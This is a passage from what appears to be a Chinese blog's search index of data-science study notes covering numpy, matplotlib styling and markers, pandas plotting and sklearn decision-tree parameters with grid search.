s+=r2_score(y_test,p.fit(X_train,y_train).predict(X_test))</span><br><span class="line">    <span class="keyword">return</span> s/cv</span><br></pre></td></tr></table></figure><ul><li>经典的交叉验证分数比较高，能把控一下大概方向对不对。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_cv</span><span class="params">(p,x,y,cv=<span class="number">5</span>,log=True)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cross_val_score(p,x,y,cv=cv).mean()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 大数据 pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据建模</title>
      <link href="/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/"/>
      <url>/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#降维">降维</a></li><li><a href="#npset_printoptions">np.set_printoptions</a></li><li><a href="#bicount">bicount</a></li><li><a href="#lexsort">lexsort</a></li><li><a href="#练习题">练习题</a><ul><li><a href="#trick">Trick</a></li><li><a href="#matplotlib">Matplotlib</a></li></ul></li><li><a href="#基本操作">基本操作</a></li><li><a href="#风格">风格</a></li><li><a href="#面向对象画图">面向对象画图</a><ul><li><a href="#结合pandas画图">结合pandas画图</a></li><li><a href="#sklearn">sklearn</a></li></ul></li><li><a href="#决策树">决策树</a><ul><li><a href="#剪枝策略">剪枝策略</a></li></ul></li><li><a href="#回归树">回归树</a></li><li><a href="#随机森林">随机森林</a></li><li><a href="#预处理">预处理</a><ul><li><a href="#方差过滤"><strong>方差过滤</strong></a></li><li><a href="#卡方过滤">卡方过滤</a></li><li><a href="#f检验只能检验线性关系">F检验（只能检验线性关系）</a></li><li><a href="#互信息法">互信息法</a></li></ul></li><li><a href="#特征工程">特征工程</a></li><li><a href="#数据预处理">数据预处理</a></li><li><a href="#逻辑回归">逻辑回归</a></li><li><a href="#perceptrons">Perceptrons</a></li><li><a href="#logisticregression">LogisticRegression</a><ul><li><a href="#做题遇到的">做题遇到的</a></li></ul></li><li><a href="#数据格式化map">数据格式化map</a></li><li><a href="#索引">索引</a></li><li><a href="#坐标轴显示百分比">坐标轴显示百分比</a></li><li><a href="#apply">apply</a></li><li><a href="#重采样">重采样</a></li><li><a href="#del">del</a></li><li><a href="#按时间筛选">按时间筛选</a></li><li><a href="#显示中文">显示中文</a></li><li><a href="#重命名">重命名</a></li><li><a href="#填充">填充</a></li><li><a href="#查询">查询</a></li><li><a href="#选择类型">选择类型</a></li><li><a href="#数据展开">数据展开</a></li><li><a href="#数据累加">数据累加</a></li><li><a href="#列操作">列操作</a></li><li><a href="#行操作">行操作</a></li><li><a href="#pivot与groupby">pivot与groupby</a></li><li><a href="#unstack">unstack</a></li><li><a href="#数据聚合">数据聚合</a></li><li><a href="#数据查询">数据查询</a></li><li><a href="#数据汇总">数据汇总</a></li><li><a href="#数据合并">数据合并</a></li><li><a href="#多个df画一起">多个DF画一起</a></li><li><a href="#分析和排序">分析和排序</a></li><li><a href="#双纵坐标轴">双纵坐标轴</a></li><li><a href="#构建空df">构建空DF</a></li><li><a href="#更改日期间隔">更改日期间隔</a></li><li><a href="#查看统计数据">查看统计数据</a></li><li><a href="#保存文件">保存文件</a></li><li><a href="#数据预处理-1">数据预处理</a></li><li><a href="#删除空行">删除空行</a></li><li><a href="#替换">替换</a><ul><li><a href="#算法总结">算法总结</a></li></ul></li><li><a href="#决策树-1">决策树</a></li></ul><!-- tocstop --><h3><span id="降维">降维</span></h3><ul><li>ravel()：如果没有必要，不会产生源数据的副本 </li><li>flatten()：返回源数据的副本 </li><li>squeeze()：只能对维数为1的维度降维</li><li>logspace 用于创建等比数列</li></ul><p>假如，我们想要改变基数，不让它以10为底数，我们可以改变base参数，将其设置为2试试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = np.logspace(<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,base=<span class="number">2</span>)</span><br><span class="line">a</span><br><span class="line">array([   <span class="number">1.</span>,    <span class="number">2.</span>,    <span class="number">4.</span>,    <span class="number">8.</span>,   <span class="number">16.</span>,   <span class="number">32.</span>,   <span class="number">64.</span>,  <span class="number">128.</span>,  <span class="number">256.</span>,  <span class="number">512.</span>])</span><br></pre></td></tr></table></figure><h3><span id="npset_printoptions">np.set_printoptions</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.set_printoptions(precision&#x3D;None, threshold&#x3D;None, edgeitems&#x3D;None, linewidth&#x3D;None, suppress&#x3D;None, nanstr&#x3D;None, infstr&#x3D;None)</span><br></pre></td></tr></table></figure><p><strong>precision :</strong></p><p>　　int, optional，float输出的精度，即小数点后维数，默认8（ Number of digits of precision for floating point output (default 8)）</p><p><strong>threshold :</strong></p><p>　　int, optional，当数组数目过大时，设置显示几个数字，其余用省略号（Total number of array elements which trigger summarization rather than full repr (default 1000).）</p><p><strong>edgeitems :</strong></p><p>　　 int, optional，边缘数目（Number of array items in summary at beginning and end of each dimension (default 3)）.</p><p><strong>linewidth :</strong></p><p>　　 int, optional，线条宽度 The number of characters per line for the purpose of inserting line breaks (default 75).</p><p><strong>suppress :</strong></p><p>　　 bool, optional，是否压缩由科学计数法表示的浮点数（Whether or not suppress printing of small floating point values using scientific notation (default False).）</p><p><strong>nanstr :</strong></p><p>　　 str, optional，String representation of floating point not-a-number (default nan).</p><p><strong>infstr :</strong></p><p>　　str, optional，String representation of floating point infinity (default inf).</p><h3><span id="bicount">bicount</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到一个数组中最常出现的数字</span></span><br><span class="line">z = np.random.randint(<span class="number">0</span>,<span class="number">10</span>,<span class="number">50</span>)</span><br><span class="line">np.set_printoptions(threshold=<span class="number">1000</span>)</span><br><span class="line">print(z)</span><br><span class="line">print(np.bincount(z))</span><br><span class="line">print(np.argmax(np.bincount(z)))</span><br><span class="line"></span><br><span class="line">[<span class="number">9</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span> <span class="number">7</span> <span class="number">1</span> <span class="number">4</span> <span class="number">0</span> <span class="number">2</span> <span class="number">5</span> <span class="number">7</span> <span class="number">7</span> <span class="number">3</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">6</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">6</span> <span class="number">7</span> <span class="number">0</span> <span class="number">9</span> <span class="number">4</span> <span class="number">5</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">7</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">2</span> <span class="number">1</span> <span class="number">9</span> <span class="number">5</span> <span class="number">0</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">8</span> <span class="number">3</span>]</span><br><span class="line">[<span class="number">5</span> <span class="number">3</span> <span class="number">3</span> <span class="number">3</span> <span class="number">5</span> <span class="number">6</span> <span class="number">6</span> <span class="number">8</span> <span class="number">6</span> <span class="number">5</span>]</span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><p>其实bicount将结果映射成一个list，分别代表0出现的次数，1出现的次数。。。</p><p>找到出现最多次数的下标就是找到一个数组中最常出现的数字</p><h3><span id="lexsort">lexsort</span></h3><p>numpy.lexsort() 用于对多个序列进行排序。把它想象成对电子表格进行排序，每一列代表一个序列，<strong>排序时优先照顾靠后的列</strong>。</p><p>这里举一个应用场景：小升初考试，重点班录取学生按照总成绩录取。在总成绩相同时，数学成绩高的优先录取，在总成绩和数学成绩都相同时，按照英语成绩录取…… 这里，总成绩排在电子表格的最后一列，数学成绩在倒数第二列，英语成绩在倒数第三列。</p><h3><span id="练习题">练习题</span></h3><h2><span id="trick">Trick</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">np.add? # 显示帮助</span><br><span class="line">np.add?? # 显示源代码</span><br><span class="line"><span class="comment"># fsting用法 python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f'My lucky number is <span class="subst">&#123;number&#125;</span>'</span></span><br></pre></td></tr></table></figure><h2><span id="matplotlib">Matplotlib</span></h2><ul><li><code>%matplotlib inline</code>: 这一句是IPython的魔法函数，可以在IPython编译器里直接使用，作用是内嵌画图，省略掉plt.show()这一步，直接显示图像。</li></ul><h3><span id="基本操作">基本操作</span></h3><ul><li><p>画图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 标签</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;plt.xlabel(&#39;xlabel&#39;,fontsize &#x3D; 16)</span><br></pre></td></tr></table></figure></li><li><p>线条&amp;颜色</p><table><thead><tr><th align="right">字符</th><th align="right">类型</th><th align="right">字符</th><th align="right">类型</th></tr></thead><tbody><tr><td align="right"><code>&#39;-&#39;</code></td><td align="right">实线</td><td align="right"><code>&#39;--&#39;</code></td><td align="right">虚线</td></tr><tr><td align="right"><code>&#39;-.&#39;</code></td><td align="right">虚点线</td><td align="right"><code>&#39;:&#39;</code></td><td align="right">点线</td></tr><tr><td align="right"><code>&#39;.&#39;</code></td><td align="right">点</td><td align="right"><code>&#39;,&#39;</code></td><td align="right">像素点</td></tr><tr><td align="right"><code>&#39;o&#39;</code></td><td align="right">圆点</td><td align="right"><code>&#39;v&#39;</code></td><td align="right">下三角点</td></tr><tr><td align="right"><code>&#39;^&#39;</code></td><td align="right">上三角点</td><td align="right"><code>&#39;&lt;&#39;</code></td><td align="right">左三角点</td></tr><tr><td align="right"><code>&#39;&gt;&#39;</code></td><td align="right">右三角点</td><td align="right"><code>&#39;1&#39;</code></td><td align="right">下三叉点</td></tr><tr><td align="right"><code>&#39;2&#39;</code></td><td align="right">上三叉点</td><td align="right"><code>&#39;3&#39;</code></td><td align="right">左三叉点</td></tr><tr><td align="right"><code>&#39;4&#39;</code></td><td align="right">右三叉点</td><td align="right"><code>&#39;s&#39;</code></td><td align="right">正方点</td></tr><tr><td align="right"><code>&#39;p&#39;</code></td><td align="right">五角点</td><td align="right"><code>&#39;*&#39;</code></td><td align="right">星形点</td></tr><tr><td align="right"><code>&#39;h&#39;</code></td><td align="right">六边形点1</td><td align="right"><code>&#39;H&#39;</code></td><td align="right">六边形点2</td></tr><tr><td align="right"><code>&#39;+&#39;</code></td><td align="right">加号点</td><td align="right"><code>&#39;x&#39;</code></td><td align="right">乘号点</td></tr><tr><td align="right"><code>&#39;D&#39;</code></td><td align="right">实心菱形点</td><td align="right"><code>&#39;d&#39;</code></td><td align="right">瘦菱形点</td></tr><tr><td align="right"><code>&#39;_&#39;</code></td><td align="right">横线点</td><td align="right"></td><td align="right"></td></tr></tbody></table><table><thead><tr><th align="right">字符</th><th align="right">颜色</th></tr></thead><tbody><tr><td align="right"><code>‘b’</code></td><td align="right">蓝色，blue</td></tr><tr><td align="right"><code>‘g’</code></td><td align="right">绿色，green</td></tr><tr><td align="right"><code>‘r’</code></td><td align="right">红色，red</td></tr><tr><td align="right"><code>‘c’</code></td><td align="right">青色，cyan</td></tr><tr><td align="right"><code>‘m’</code></td><td align="right">品红，magenta</td></tr><tr><td align="right"><code>‘y’</code></td><td align="right">黄色，yellow</td></tr><tr><td align="right"><code>‘k’</code></td><td align="right">黑色，black</td></tr><tr><td align="right"><code>‘w’</code></td><td align="right">白色，white</td></tr></tbody></table></li><li><p>线条风格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">或者将两者结合使用</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;plt.plot([1,2,3,4,5],[1,4,9,16,25],&#39;ro&#39;)</span><br></pre></td></tr></table></figure></li><li><p>线宽 linewidth</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 子图</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  # 211 表示一会要画的图是2行一列的 最后一个1表示的是子图当中的第1个图</span><br><span class="line">  plt.subplot(211)</span><br><span class="line">  plt.plot(x,y,color&#x3D;&#39;r&#39;)</span><br><span class="line">  </span><br><span class="line">  # 212 表示一会要画的图是2行一列的 最后一个1表示的是子图当中的第2个图</span><br><span class="line">  plt.subplot(212)</span><br><span class="line">  plt.plot(x,y,color&#x3D;&#39;b&#39;)</span><br></pre></td></tr></table></figure></li><li><p>标题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 文本</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;plt.text(x,y,&#39;text)</span><br></pre></td></tr></table></figure><p>x,y为数轴上的坐标</p></li><li><p>网格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 注释</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;plt.annotate(&#39;tangyudi&#39;,xy&#x3D;(-5,0),xytext&#x3D;(-2,0.3),arrowprops &#x3D; dict(facecolor&#x3D;&#39;red&#39;,shrink&#x3D;0.05,headlength&#x3D; 20,headwidth &#x3D; 20))</span><br></pre></td></tr></table></figure></li></ul><h3><span id="风格">风格</span></h3><ul><li><p>查看风格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>[‘dark_background’,<br> ‘seaborn-talk’,<br> ‘seaborn-bright’,<br> ‘seaborn-ticks’,<br> ‘bmh’,<br> ‘ggplot’,<br> ‘seaborn-darkgrid’,<br> ‘classic’,<br> ‘fivethirtyeight’,<br> ‘seaborn-deep’,<br> ‘seaborn-colorblind’,<br> ‘seaborn-muted’,<br> ‘seaborn-pastel’,<br> ‘seaborn-notebook’,<br> ‘seaborn-paper’,<br> ‘seaborn-dark-palette’,<br> ‘seaborn-whitegrid’,<br> ‘seaborn-white’,<br> ‘grayscale’,<br> ‘seaborn-dark’,<br> ‘seaborn-poster’]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- 使用风格</span><br><span class="line">  &#96;&#96;&#96;plt.style.use(&#39;ggplot&#39;)</span><br></pre></td></tr></table></figure><p>Parameters</p><ul><li><p>style：str, dict, Path or list</p><p>A style specification. Valid options are:</p><ul><li><p>str: The name of a style or a path/URL to a style file. For a list of available style names, see <a href="https://matplotlib.org/stable/api/style_api.html?highlight=style#matplotlib.style.matplotlib.style.available" target="_blank" rel="noopener"><code>style.available</code></a>.</p></li><li><p>dict: Dictionary with valid key/value pairs for <a href="https://matplotlib.org/stable/api/matplotlib_configuration_api.html#matplotlib.rcParams" target="_blank" rel="noopener"><code>matplotlib.rcParams</code></a>.</p></li><li><p>Path: A path-like object which is a path to a style file.</p></li><li><p>list: A list of style specifiers (str, Path or dict) applied from first to last in the list.</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.linspace(<span class="number">-10</span>,<span class="number">10</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.style.use(<span class="string">'ggplot'</span>)</span><br><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></li></ul><h3><span id="面向对象画图">面向对象画图</span></h3><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line"><span class="comment">#创建图形对象</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line"><span class="comment">#我们使用 add_axes() 将 axes 轴域添加到画布中</span></span><br><span class="line"><span class="comment">#add_axes() 的参数值是一个序列，序列中的 4 个数字分别对应图形的左侧开始画图位置，底部开始画图位置，宽度缩放，和高度缩放，且每个数字必须介于 0 到 1 之间。</span></span><br><span class="line">ax=fig.add_axes([<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">ax.plot(x,y)</span><br><span class="line">ax.set_title(<span class="string">"sine wave"</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">'angle'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'sine'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></code></pre><ul><li>图例</li></ul><p>axes 类的 legend() 方法负责绘制画布中的图例，它需要三个参数，如下所示：</p><p>ax.legend(handles, labels, loc)</p><ul><li>labels 是一个字符串序列，用来指定标签的名称；</li><li>loc 是指定图例位置的参数，其参数值可以用字符串或整数来表示；</li><li>handles 参数，它也是一个序列，它包含了所有线型的实例；</li></ul><p><a href="http://c.biancheng.net/matplotlib/" target="_blank" rel="noopener">http://c.biancheng.net/matplotlib/</a></p><p><img src="https://pic3.zhimg.com/v2-cfe3dd3becbae38d3af4659b4ff1676a_r.jpg" alt="preview"></p><p><a href="https://zhuanlan.zhihu.com/p/139052035" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/139052035</a></p><p><img src="https://pic3.zhimg.com/80/v2-6e4429872eeb8a155433c0ee7c75b6ea_1440w.jpg" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-124378df90b3ff1e24eb48c36af08dc9_1440w.jpg" alt="img"></p><p><a href="https://zhuanlan.zhihu.com/p/93423829" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/93423829</a></p><h2><span id="结合pandas画图">结合pandas画图</span></h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">df=pandas.DataFrame()</span><br><span class="line">常见的画图方法如下：</span><br><span class="line">df.plot()</span><br><span class="line">也可以传入参数：df.plot(kind=value)决定画什么类型的图</span><br><span class="line">kind=line    画折线图</span><br><span class="line">kind=bar     x轴画矩形图</span><br><span class="line">kind=barh    y轴画矩形图</span><br><span class="line">kind=pie     画饼图</span><br><span class="line">kind=scatter 画散点</span><br><span class="line">kind=<span class="keyword">box</span>     画盒子图</span><br><span class="line">kind=kde     画核密度估计图</span><br><span class="line"></span><br><span class="line">或者:</span><br><span class="line">df.plot.line()</span><br><span class="line">df.plot.bar()</span><br><span class="line">df.plot.barh()</span><br><span class="line">df.plot.pie()</span><br><span class="line">df.plot.scatter()</span><br><span class="line">df.plot.<span class="keyword">box</span>()</span><br><span class="line">df.plot.kde()</span><br></pre></td></tr></table></figure><h2><span id="sklearn">sklearn</span></h2><h3><span id="决策树">决策树</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> graphviz</span><br><span class="line"><span class="comment"># pandas拼接数据</span></span><br><span class="line">df = pd.concat([pd.DataFrame(wine.data), pd.DataFrame(wine.target)],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 划分训练集和测试集</span></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data, wine.target, test_size=<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># 实例化一个分类器</span></span><br><span class="line">clf = tree.DecisionTreeClassifier(criterion=<span class="string">'entropy'</span>,random_state=<span class="number">3</span>,splitter=<span class="string">"random"</span>)</span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># 评价结果</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用graphviz画出决策树</span></span><br><span class="line">dot_data = tree.export_graphviz(clf, feature_names=wine.feature_names, class_names=[<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>], filled=<span class="literal">True</span>, rounded=<span class="literal">True</span>, special_characters=<span class="literal">True</span>)</span><br><span class="line">graph = graphviz.Source(dot_data)</span><br><span class="line">graph</span><br><span class="line"><span class="comment"># 确定最优剪枝参数</span></span><br><span class="line">test = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    clf = tree.DecisionTreeClassifier(criterion=<span class="string">'entropy'</span>,random_state=<span class="number">30</span>,</span><br><span class="line">                                      splitter=<span class="string">"random"</span>,</span><br><span class="line">                                     max_depth=i+<span class="number">1</span>,</span><br><span class="line">                                     )</span><br><span class="line">    clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line">    score = clf.score(Xtest, Ytest)</span><br><span class="line">    test.append(score)</span><br><span class="line"></span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">11</span>), test, color=<span class="string">'red'</span>, label=<span class="string">'max_depth'</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># 网格搜索</span></span><br><span class="line"><span class="comment"># 使用网格搜索，能够帮助我们同时调整多个参数，采用枚举法</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">entropy_thresholds = np.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">50</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">"criterion"</span>:(<span class="string">'gini'</span>,<span class="string">'entropy'</span>)</span><br><span class="line">    ,<span class="string">"splitter"</span>:(<span class="string">'best'</span>,<span class="string">'random'</span>)</span><br><span class="line">    ,<span class="string">'max_depth'</span>:[*range(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">'min_samples_leaf'</span>:[*range(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">'min_impurity_decrease'</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br></pre></td></tr></table></figure><ul><li>特征重要性</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;[*zip(feature_name,clf.feature_importances_)]</span><br></pre></td></tr></table></figure><ul><li>Criterion这个参数正是用来决定不纯度的计算方法的。sklearn提供了两种选择：</li></ul><p>1）输入”entropy“，使用<strong>信息熵</strong>（Entropy） </p><p>2）输入”gini“，使用<strong>基尼系数</strong>（Gini Impurity）</p><blockquote><p>通常就使用基尼系数</p><p>数据维度很大，噪音很大时使用基尼系数</p><p>维度低，数据比较清晰的时候，信息熵和基尼系数没区别</p><p>当决策树的拟合程度不够的时候，使用信息熵</p><p>两个都试试，不好就换另外一个</p></blockquote><ul><li><p><strong>random_state &amp; splitter</strong></p><p>random_state用来设置分枝中的随机模式的参数，默认None，在高维度时随机性会表现更明显，低维度的数据（比如鸢尾花数据集），随机性几乎不会显现。输入任意整数，会一直长出同一棵树，让模型稳定下来。</p><p>splitter也是用来控制决策树中的随机选项的，有两种输入值，输入”best”，决策树在分枝时虽然随机，但是还是会优先选择更重要的特征进行分枝（重要性可以通过属性feature_importances_查看），输入“random”，决策树在分枝时会更加随机，树会因为含有更多的不必要信息而更深更大，并因这些不必要信息而降低对训练集的拟合。这也是防止过拟合的一种方式。当你预测到你的模型会过拟合，用这两个参数来帮助你降低树建成之后过拟合的可能性。当然，树一旦建成，我们依然是使用剪枝参数来防止过拟合</p></li></ul><h4><span id="剪枝策略">剪枝策略</span></h4><ul><li><strong>max_depth</strong></li></ul><p>​      限制树的最大深度，超过设定深度的树枝全部剪掉</p><ul><li><p><strong>min_samples_leaf &amp; min_samples_split</strong></p><p>min_samples_leaf限定，一个节点在分枝后的每个子节点都必须包含至少min_samples_leaf个训练样本，否则分枝就不会发生，或者，分枝会朝着满足每个子节点都包含min_samples_leaf个样本的方向去发生。一般搭配max_depth使用，在回归树中有神奇的效果，可以让模型变得更加平滑。这个参数的数量设置得太小会引起过拟合，设置得太大就会阻止模型学习数据。一般来说，建议从=5开始使用。如果叶节点中含有的样本量变化很大，建议输入浮点数作为样本量的百分比来使用。同时，这个参数可以保证每个叶子的最小尺寸，可以在回归问题中避免低方差，过拟合的叶子节点出现。对于类别不多的分类问题，=1通常就是最佳选择。</p><p>min_samples_split限定，一个节点必须要包含至少min_samples_split个训练样本，这个节点才允许被分枝，否则分枝就不会发生。</p></li></ul><h3><span id="回归树">回归树</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeRegressor</span><br><span class="line">regr_1 = DecisionTreeRegressor(max_depth=<span 